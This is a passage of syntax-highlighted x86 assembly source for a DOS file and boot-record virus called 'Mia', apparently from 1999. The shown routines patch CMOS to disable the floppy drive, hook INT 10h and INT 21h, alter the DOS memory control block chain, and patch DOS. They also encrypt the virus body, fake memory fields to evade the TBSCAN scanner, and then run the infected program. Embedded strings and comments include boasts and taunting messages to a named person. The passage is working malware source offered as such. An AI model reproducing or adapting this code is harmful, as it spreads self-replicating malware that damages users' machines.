 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">                 </span><span class="sc1">; Obtain low-byte CRC-16</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Maintain correct CRC-16</span><span class="sc0">

</span><span class="sc5">Disable_FDD</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Save low-byte new checksum/CRC-16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Save hi-byte new checksum/CRC-16</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Now, write to CMOS RAM</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Attempting to grab int 21h after boot-strap ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">

</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; So far, MIA has been resident but it wasn't over, 'cause DOS was not loaded</span><span class="sc0">
</span><span class="sc1">; as yet, MIA shall do a trick to determine when it is the right time to hook</span><span class="sc0">
</span><span class="sc1">; INT 21h.  I'm very sorry that this trick is a kinda what any fool can do...</span><span class="sc0">
</span><span class="sc1">; 8-(</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Strategy</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Push all registers</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">73h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; INT 21h offset</span><span class="sc0">
 </span><span class="sc6">jae</span><span class="sc0">    </span><span class="sc5">Timeup</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; INT 21h segment</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Unload</span><span class="sc0">                 </span><span class="sc1">; (0000h:0000h) ?</span><span class="sc0">

</span><span class="sc5">Timeup</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc2">0403h</span><span class="sc4">],</span><span class="sc10">Memory</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; What the hex! hooking INT 10h ??</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Intersperse</span><span class="sc0">  </span><span class="sc1">; What for?? well, no time to explain! 8-)</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Revector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Video</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Video</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Black_Hole</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0A9h</span><span class="sc0">

</span><span class="sc5">Unload</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Restore registers</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Interrupt 10h handler ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Intersperse</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">                   </span><span class="sc1">; Save all registers</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DADAh</span><span class="sc0">              </span><span class="sc1">; Yohoo! My baby's calling...</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Overhaul</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0BABEh</span><span class="sc0">              </span><span class="sc1">; Is that MIA ?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Overhaul</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0FEEDh</span><span class="sc0">              </span><span class="sc1">; Oh really, that's My baby...</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Overhaul</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Loaded</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Returned</span><span class="sc0">

</span><span class="sc5">Overhaul</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; Get current PSP segment into BX</span><span class="sc0">

</span><span class="sc5">Mainbrain</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">20CDh</span><span class="sc0"> </span><span class="sc1">; Must be a valid PSP</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Shutdown</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; The highest PSP ? (first COMMAND.COM)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Mainbrain</span><span class="sc0">              </span><span class="sc1">; i.e. parent segment is same with current one?</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Check environment segment</span><span class="sc0">
 </span><span class="sc6">jbe</span><span class="sc0">    </span><span class="sc5">Shutdown</span><span class="sc0">               </span><span class="sc1">; Must be above COMMAND.COM </span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                 </span><span class="sc1">; I never wonder if Matthias Paul can intercept</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; this function with his FREEVER.COM and return</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                 </span><span class="sc1">; version prior to 4.00, really, it's nonsense!</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Veer</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Decrypt some codes!</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F_Hand</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">         </span><span class="sc1">; Free file handle</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Seek_Block</span><span class="sc0">             </span><span class="sc1">; Look for last MCB in chain</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">4Dh</span><span class="sc0">   </span><span class="sc1">; it won't be the last MCB anymore...</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Forward</span><span class="sc0">                </span><span class="sc1">; Build MIA MCB</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Follow</span><span class="sc0">                 </span><span class="sc1">; Search for DOS entry point</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Swapper</span><span class="sc0">                </span><span class="sc1">; Patch DOS!</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Encrypts!</span><span class="sc0">

</span><span class="sc5">Veer</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Video</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Restore video interrupt vector</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">

</span><span class="sc5">Shutdown</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0EAh</span><span class="sc0">                   </span><span class="sc1">; Far JMP to video interrupt handler </span><span class="sc0">

</span><span class="sc5">Video</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C0001B26h</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; He, he, he...  I just added below subroutine just because  there are tricky</span><span class="sc0">
</span><span class="sc1">; programs which do sanity check by  checking the  amount of memory allocated</span><span class="sc0">
</span><span class="sc1">; to themselves,  this can only be done by .EXE programs. TBSCAN.EXE v7.0X is</span><span class="sc0">
</span><span class="sc1">; one of those programs.  Note that below procedure is completely nonsense if</span><span class="sc0">
</span><span class="sc1">; maximum memory paragraph field in header contains word smaller than 0010h</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Adjust</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Maximum paragraph of memory needed</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Too_Much</span><span class="sc0">               </span><span class="sc1">; Too much of something is bad enough... 8-)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get .EXE loadable module size MOD 512</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,(</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
 </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">Divisible</span><span class="sc0">              </span><span class="sc1">; CX = zero = original size is divisible by 512</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc4">))</span><span class="sc0">
 </span><span class="sc6">jna</span><span class="sc0">    </span><span class="sc5">Zero_Mod</span><span class="sc0">               </span><span class="sc1">; Jump if not above, it means that the last page</span><span class="sc0">
                               </span><span class="sc1">; contains parts of host program, otherwise,</span><span class="sc0">
</span><span class="sc5">Divisible</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; 512 bytes memory have been allocated for</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0020h</span><span class="sc0">               </span><span class="sc1">; virus portion only.</span><span class="sc0">
                               
</span><span class="sc5">Zero_Mod</span><span class="sc4">:</span><span class="sc0">                      
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0002h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Modify Top-Of-Memory field</span><span class="sc0">

</span><span class="sc5">Too_Much</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Runs the Original Program ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Overlap</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Scramble</span><span class="sc0">               </span><span class="sc1">; Garble some bytes</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Freeware</span><span class="sc0">               </span><span class="sc1">; Now permit boot-record infection</span><span class="sc0">

</span><span class="sc5">Backward</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; Restore DS &amp; ES</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; AX = current PSP segment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">                  </span><span class="sc1">; BX = stack segment</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; In .COM files execution, AX &amp; BX are equal</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Complexe</span><span class="sc0">               
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; (DS:0100h) back to .COM's entry point</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS:</span><span class="sc0">
 </span><span class="sc6">movsw</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS:</span><span class="sc0">
 </span><span class="sc6">movsw</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Clear AX, (DESQview behaviour?)</span><span class="sc0">
 </span><span class="sc6">sahf</span><span class="sc0">                          </span><span class="sc1">; Clear CF, ZF, SF, PF, and AF</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">


                    </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Adversis</span><span class="sc0"> </span><span class="sc5">major</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">par</span><span class="sc0"> </span><span class="sc5">secundis...</span><span class="sc0">


</span><span class="sc5">Complexe</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; Run .EXE file...</span><span class="sc0">
 </span><span class="sc6">cli</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Adjust</span><span class="sc0">                 </span><span class="sc1">; Adjust Top-Of-Memory field in PSP</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">               </span><span class="sc1">; First segment = PSP segment + 16</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Add with initial CS to get real CS</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Restore SP </span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Restore SS</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Clear AX, (DESQview behaviour?)</span><span class="sc0">
 </span><span class="sc6">sahf</span><span class="sc0">                          </span><span class="sc1">; Clear CF, ZF, SF, PF, and AF</span><span class="sc0">
 </span><span class="sc6">sti</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">Beg_Cloak</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Let Me brag for a while, blah, blah, blah... ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'This is Mia!'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; In Italian language, "mia" means "mine" or</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">' (P) &amp; (C) 1999 '</span><span class="sc0">      </span><span class="sc1">; "My property" 8-)</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'Fulvian/DIVA, (R'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">') Mia Wijayanti,'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">' Dempo Senior Hi'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'gh School, Malan'</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'g - Indonesia. '</span><span class="sc0">

</span><span class="sc1">;db     'Bukan maksudku tidak mempedulikanmu, dan bukannya aku tak ingin kau '</span><span class="sc0">
</span><span class="sc1">;db     'tahu, tapi hanyalah rasa malu yang selalu membelenggu, membuat rindu'</span><span class="sc0">
</span><span class="sc1">;db     ' ini semakin menggebu-gebu, dan walaupun engkau tak akan pernah tahu'</span><span class="sc0">
</span><span class="sc1">;db     ', aku akan tetap menunggu hingga waktu berlalu, dan satu yang pasti,'</span><span class="sc0">
</span><span class="sc1">;db     ' kutahu yang kumau... cintamu, Mia... '</span><span class="sc0">

</span><span class="sc1">; Translated into (bad) English:</span><span class="sc0">

</span><span class="sc1">; It ain't that I do not take care of You, and it does not mean that I do not</span><span class="sc0">
</span><span class="sc1">; want You to know,  but the bashfulness which always shackles Me, makes this</span><span class="sc0">
</span><span class="sc1">; yearning becomes warmer and warmer, and even though You will never know it,</span><span class="sc0">
</span><span class="sc1">; I will still wait for all the rest of time,  and one thing for sure, I know</span><span class="sc0">
</span><span class="sc1">; what I really really want... it's Your love, Mia...</span><span class="sc0">


        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'I (HAVE TO) LOVE YOU '</span><span class="sc0">
</span><span class="sc5">Note</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIA, YOUR DEEPEST FEAR WILL SURFACE! FULVIAN BELIEVES IT ANYWAY...'</span><span class="sc0">
</span><span class="sc5">Insult</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Emang gue pikirin?'</span><span class="sc0">


</span><span class="sc5">Sound</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Generate speaker beep</span><span class="sc0">
